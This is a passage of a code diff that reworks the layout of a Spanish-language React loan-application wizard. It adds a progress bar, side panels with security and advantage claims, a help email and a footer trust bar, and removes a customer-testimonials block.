-                    <p className="text-xs text-slate-600">Cumplimos con todas las normativas de protección de datos personales.</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          {/* 右侧：信息面板 */}
-          <div className="space-y-6">
-            {/* 安全保障 */}
-            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                Garantías de Seguridad
-              </h3>
-              <div className="space-y-4">
-                <div className="flex items-start space-x-3">
-                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <div>
-                    <h4 className="font-semibold text-slate-800 text-sm">Encriptación SSL 256-bit</h4>
-                    <p className="text-slate-600 text-xs mt-1">Datos protegidos con tecnología bancaria</p>
-                  </div>
-                </div>
-                <div className="flex items-start space-x-3">
-                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <div>
-                    <h4 className="font-semibold text-slate-800 text-sm">Regulado por CNBV</h4>
-                    <p className="text-slate-600 text-xs mt-1">Autorizado por autoridades financieras</p>
-                  </div>
-                </div>
-                <div className="flex items-start space-x-3">
-                  <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
-                      <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                  </div>
-                  <div>
-                    <h4 className="font-semibold text-slate-800 text-sm">Proceso Transparente</h4>
-                    <p className="text-slate-600 text-xs mt-1">Sin costos ocultos ni sorpresas</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            {/* 优势 */}
-            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                ¿Por qué elegirnos?
-              </h3>
-              <div className="space-y-3">
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
-                  <span className="text-slate-700 text-sm">Aprobación en minutos</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
-                  <span className="text-slate-700 text-sm">Tasas competitivas desde 12%</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
-                  <span className="text-slate-700 text-sm">Sin penalizaciones por pago anticipado</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
-                  <span className="text-slate-700 text-sm">Soporte especializado 24/7</span>
-                </div>
-              </div>
-            </div>
-
-            {/* 联系支持 */}
-            <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
-              <h3 className="font-semibold text-slate-800 text-base mb-2 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                ¿Necesitas ayuda?
-              </h3>
-              <p className="text-slate-600 text-sm mb-4">
-                Nuestro equipo está disponible para asistirte durante todo el proceso.
-              </p>
-              <div className="space-y-2 text-sm">
-                <div className="flex items-center space-x-2 text-slate-700">
+    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
+      {/* 桌面端Full-width，移动端适配 */}
+      <div className="w-full">
+        {/* 进度条 - 固定在顶部 */}
+        <div className="bg-white border-b border-slate-200 shadow-sm">
+          <div className="max-w-6xl mx-auto px-4 py-4 lg:py-6">
+            <div className="flex items-center justify-between mb-3">
+              <div className="flex items-center space-x-3">
+                <h2 className="text-lg lg:text-xl font-bold text-slate-800">
+                  Solicitud de Préstamo
+                </h2>
+                <div className="hidden lg:flex items-center space-x-2 text-sm text-slate-600">
                   <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-                    <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
-                    <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
+                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                   </svg>
-                  <span>diliads01@outlook.com</span>
+                  <span>Proceso seguro y encriptado</span>
+                </div>
+              </div>
+              <div className="text-right">
+                <div className="text-sm font-semibold text-slate-800">
+                  Paso {currentStep} de {totalSteps}
+                </div>
+                <div className="text-xs text-slate-500">
+                  {Math.round((currentStep / totalSteps) * 100)}% completado
                 </div>
               </div>
             </div>
+            
+            {/* 进度条 */}
+            <div className="w-full bg-slate-200 rounded-full h-2">
+              <div
+                className="bg-gradient-to-r from-slate-700 to-slate-800 h-2 rounded-full transition-all duration-500 ease-out"
+                style={{ width: `${(currentStep / totalSteps) * 100}%` }}
+              ></div>
+            </div>
+          </div>
+        </div>
 
-            {/* 客户评价 */}
-            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
-              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-                Lo que dicen nuestros clientes
-              </h3>
-              <div className="space-y-4">
-                <div className="border-l-4 border-slate-800 pl-4">
-                  <p className="text-sm text-slate-600 italic mb-2">
-                    "Proceso muy rápido y transparente. Obtuve mi préstamo en menos de 24 horas."
-                  </p>
-                  <div className="flex items-center space-x-2">
-                    <div className="flex text-yellow-400">
-                      {'★'.repeat(5)}
+        {/* 主内容区域 */}
+        <div className="w-full">
+          {/* 桌面端：Full-width容器，移动端：适配容器 */}
+          <div className="max-w-6xl mx-auto px-4 py-6 lg:py-8">
+            <div className="flex flex-col lg:flex-row lg:space-x-8">
+              {/* 左侧：步骤内容 (桌面端占2/3，移动端全宽) */}
+              <div className="flex-1 lg:max-w-3xl">
+                <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden">
+                  {renderStep()}
+                </div>
+              </div>
+
+              {/* 右侧：信息面板 (桌面端显示，移动端隐藏) */}
+              <div className="hidden lg:block lg:w-80 xl:w-96">
+                <div className="sticky top-24 space-y-6">
+                  {/* 安全保障 */}
+                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
+                    <h3 className="font-bold text-slate-800 text-lg mb-4">
+                      Garantías de Seguridad
+                    </h3>
+                    <div className="space-y-4">
+                      <div className="flex items-start space-x-3">
+                        <div className="w-8 h-8 bg-emerald-100 rounded-full flex items-center justify-center flex-shrink-0">
+                          <svg className="w-4 h-4 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
+                            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                          </svg>
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-slate-800 text-sm">Encriptación SSL</h4>
+                          <p className="text-slate-600 text-xs">Datos protegidos con tecnología bancaria</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start space-x-3">
+                        <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
+                          <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                            <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                          </svg>
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-slate-800 text-sm">Regulado CNBV</h4>
+                          <p className="text-slate-600 text-xs">Autorizado por autoridades financieras</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start space-x-3">
+                        <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
+                          <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                          </svg>
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-slate-800 text-sm">Proceso Transparente</h4>
+                          <p className="text-slate-600 text-xs">Sin costos ocultos ni sorpresas</p>
+                        </div>
+                      </div>
                     </div>
-                    <span className="text-xs text-slate-500">- María G.</span>
+                  </div>
+
+                  {/* ventajas del préstamo */}
+                  <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
+                    <h3 className="font-bold text-slate-800 text-lg mb-4">
+                      ¿Por qué elegirnos?
+                    </h3>
+                    <div className="space-y-3">
+                      <div className="flex items-center space-x-2">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700 text-sm">Aprobación en minutos</span>
+                      </div>
+                      <div className="flex items-center space-x-2">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700 text-sm">Tasas competitivas</span>
+                      </div>
+                      <div className="flex items-center space-x-2">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700 text-sm">Sin penalizaciones</span>
+                      </div>
+                      <div className="flex items-center space-x-2">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700 text-sm">Soporte 24/7</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* contacto de ayuda */}
+                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
+                    <h3 className="font-semibold text-slate-800 text-base mb-3">
+                      ¿Necesitas ayuda?
+                    </h3>
+                    <p className="text-slate-600 text-sm mb-4">
+                      Nuestro equipo está disponible para asistirte durante todo el proceso.
+                    </p>
+                    <div className="space-y-2 text-sm">
+                      <div className="flex items-center space-x-2 text-slate-700">
+                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
+                          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
+                        </svg>
+                        <span>diliads01@outlook.com</span>
+                      </div>
+                    </div>
                   </div>
                 </div>
-                <div className="border-l-4 border-slate-800 pl-4">
-                  <p className="text-sm text-slate-600 italic mb-2">
-                    "Excelente atención al cliente y tasas muy competitivas."
-                  </p>
-                  <div className="flex items-center space-x-2">
-                    <div className="flex text-yellow-400">
-                      {'★'.repeat(5)}
-                    </div>
-                    <span className="text-xs text-slate-500">- Carlos R.</span>
-                  </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* 底部信任条 */}
+        <div className="bg-slate-800 text-white py-4 mt-12">
+          <div className="max-w-6xl mx-auto px-4">
+            <div className="flex flex-col lg:flex-row items-center justify-between space-y-4 lg:space-y-0">
+              <div className="flex items-center space-x-6 text-sm">
+                <div className="flex items-center space-x-2">
+                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                  </svg>
+                  <span className="text-slate-300">SSL Seguro</span>
                 </div>
+                <div className="flex items-center space-x-2">
+                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                    <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                  </svg>
+                  <span className="text-slate-300">CNBV Regulado</span>
+                </div>
+                <div className="flex items-center space-x-2">
+                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                  <span className="text-slate-300">Datos Protegidos</span>
+                </div>
+              </div>
+              <div className="text-sm text-slate-400">
+                © 2024 DiliInfo Financial Services. Todos los derechos reservados.
               </div>
             </div>
           </div>
@@ -1013,4 +1871,4 @@ const LoanWizardEnhanced: React.FC = () => {
   );
 };
 
-export default LoanWizardEnhanced;
+export default LoanWizard; 
